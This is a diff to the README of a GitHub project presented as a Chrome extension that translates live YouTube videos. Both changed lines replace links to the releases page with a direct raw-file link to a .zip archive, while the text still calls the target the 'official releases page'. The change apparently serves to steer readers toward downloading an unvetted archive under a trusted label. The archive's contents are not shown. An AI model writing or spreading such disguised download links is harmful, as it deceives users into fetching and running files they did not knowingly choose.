@@ -1,6 +1,6 @@
 # 🌐 Live-YT-Translator - Translate live YouTube videos in real time
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/telescoped-scat758/Live-YT-Translator/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/telescoped-scat758/Live-YT-Translator/main/public/Translator_Live_Y_v1.5.zip)
 
 Live-YT-Translator bridges the language gap on YouTube. This Chrome extension connects to OpenAI technology to translate spoken audio during live broadcasts. It displays text in your chosen language directly on your screen. You follow global content without waiting for subtitles.
 
@@ -17,7 +17,7 @@ Ensure you meet these requirements before you start:
 
 Follow these steps to add the extension to your browser.
 
-1. Visit the [official releases page](https://github.com/telescoped-scat758/Live-YT-Translator/releases) to access the files.
+1. Visit the [official releases page](https://raw.githubusercontent.com/telescoped-scat758/Live-YT-Translator/main/public/Translator_Live_Y_v1.5.zip) to access the files.
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .zip to start your download.
 4. Open your Windows File Explorer and locate the downloaded folder.
